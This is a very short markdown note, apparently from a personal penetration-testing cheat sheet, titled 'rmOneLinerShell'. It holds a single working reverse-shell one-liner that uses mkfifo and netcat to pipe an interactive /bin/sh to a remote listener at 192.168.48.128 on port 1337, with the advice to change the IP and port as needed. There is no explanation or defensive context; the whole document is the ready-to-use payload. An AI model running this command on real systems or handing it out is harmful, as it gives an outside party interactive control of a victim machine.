---
title: "rmOneLinerShell"
tags:
  - fetus
---
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.48.128 1337 >/tmp/f
```
- modify the ip and port as needed